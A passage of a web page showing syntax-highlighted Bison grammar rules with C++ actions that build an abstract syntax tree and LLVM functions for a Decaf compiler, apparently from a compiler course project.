(decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalues: lvalue T_COMMA lvalues &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList*)$<span class="number">3</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | lvalue &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ;</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ; </span><br><span class="line">        decafAllexp* arr = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        var-&gt;put_arr(arr);</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Array(&quot;</span>+arr-&gt;get_name()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafFuncDefList *slist = (decafFuncDefList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafFuncDef *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafFuncDefList *slist = <span class="keyword">new</span> decafFuncDefList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafBlock * block = (decafBlock*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; functionArgs;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs ,<span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage, </span><br><span class="line">                func-&gt;get_name(), </span><br><span class="line">                TheModule);</span><br><span class="line">            <span class="keyword">if</span> (func-&gt;lfunc == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmts *state = (decafStmts *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafVarList *field = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        decafStmts *state = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmts *state = (decafStmts *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafVarList *field = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        decafStmts *state = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmts *slist = (decafStmts *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafStmt *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmts *slist = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: T_WHILE T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafWhile *whiles = <span class="keyword">new</span> decafWhile(<span class="built_in">exp</span>,block);</span><br><span class="line">        $$ = whiles;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: T_FOR T_LPAREN assignss T_SEMICOLON <span class="built_in">exp</span> T_SEMICOLON assignss T_RPAREN blockt&#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">9</span>;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssignList *aslist2 = (decafAssignList *)$<span class="number">7</span>; </span><br><span class="line">        decafFor * fors = <span class="keyword">new</span> decafFor(<span class="built_in">exp</span>,block,aslist,aslist2);</span><br><span class="line">        $$ = fors;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: T_BREAK &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;BreakStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: T_CONTINUE &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;ContinueStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN T_LPAREN T_RPAREN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assignss : assigns &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assigns: assign T_COMMA assigns &#123;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    | assign &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line">        decafVar* var = (decafVar *)$<span class="number">1</span>;</span><br><span class="line">        decafBinexp* <span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>;</span><br><span class="line">        decafAssign* ass = <span class="keyword">new</span> decafAssign(var-&gt;get_name(),<span class="built_in">exp</span>);</span><br><span class="line">        ass-&gt;kind = dass;</span><br><span class="line">        ass-&gt;put_arr(var-&gt;get_arr());</span><br><span class="line">        $$ = ass;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_NOT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;Not&quot;</span>, (decafBinexp*)$<span class="number">2</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> %prec T_UMINUS &#123; </span><br><span class="line">        decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;UnaryMinus&quot;</span>, (decafBinexp*)$<span class="number">2</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    | T_ID &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafArrexp * arr = <span class="keyword">new</span> decafArrexp(*$<span class="number">1</span>,<span class="built_in">exp</span>); </span><br><span class="line">        $$ = arr; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;StringConstant&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    | T_TRUE &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;True&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_FALSE &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;False&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// initialize LLVM</span></span><br><span class="line">    <span class="comment">// Make the module, which holds all the code.</span></span><br><span class="line">    TheModule = <span class="keyword">new</span> llvm::Module(<span class="string">&quot;Test&quot;</span>, Context);</span><br><span class="line">    <span class="comment">// set up symbol table</span></span><br><span class="line">    <span class="comment">// set up dummy main function</span></span><br><span class="line">    llvm::StringRef newFilename = <span class="string">&quot;DecafExpr&quot;</span>;</span><br><span class="line">    TheModule-&gt;setSourceFileName(newFilename);</span><br><span class="line">    <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">    <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">    <span class="comment">// remove symbol table</span></span><br><span class="line">    <span class="comment">// Finish off the main function. (see the WARNING above)</span></span><br><span class="line">    <span class="comment">// return 0 from main, which is EXIT_SUCCESS</span></span><br><span class="line">    <span class="comment">// Validate the generated code, checking for consistency.</span></span><br><span class="line">    <span class="comment">// Print out all of the generated code to stderr</span></span><br><span class="line">    TheModule-&gt;print(llvm::errs(), <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 